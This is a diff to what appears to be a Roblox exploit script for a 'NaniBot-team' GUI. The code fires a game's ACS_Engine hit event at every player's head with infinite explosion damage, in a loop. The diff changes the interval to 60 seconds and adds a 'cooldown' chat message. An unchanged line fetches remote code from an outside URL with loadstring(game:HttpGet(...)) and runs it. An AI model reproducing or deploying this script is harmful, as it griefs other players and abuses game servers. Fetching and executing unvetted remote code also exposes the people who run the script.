@@ -166,7 +166,7 @@ local function ICPIX_fake_script() -- KnsGui.LocalScript
 	                ["DestroyJointRadiusPercent"] = math.huge,
 	                ["ExplosionDamage"] = math.huge,
 	            }
-	            while wait(1) do 
+	            while wait(60) do 
 	                pcall(function()
 	                    for i,v in pairs(game.Players:GetChildren()) do
 	                        game.ReplicatedStorage.ACS_Engine.Eventos.Hit:FireServer(v.Character.Head.Position, v.Character.Head, v.Character.Head.Position, Enum.Material.Plastic, Settings)
@@ -174,6 +174,7 @@ local function ICPIX_fake_script() -- KnsGui.LocalScript
 	                end)
 	            end
 	            loadstring(game:HttpGet("https://mynickname.com/blastingstone"))()
+		    game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = "[NaniBot-team] Cooldown 60second!", Colour = Color3.fromRGB(0, 255, 93), Font = Enum.Font.GothamBold})
 	        end
 	    else
 	        player:Kick("your Fall Login")
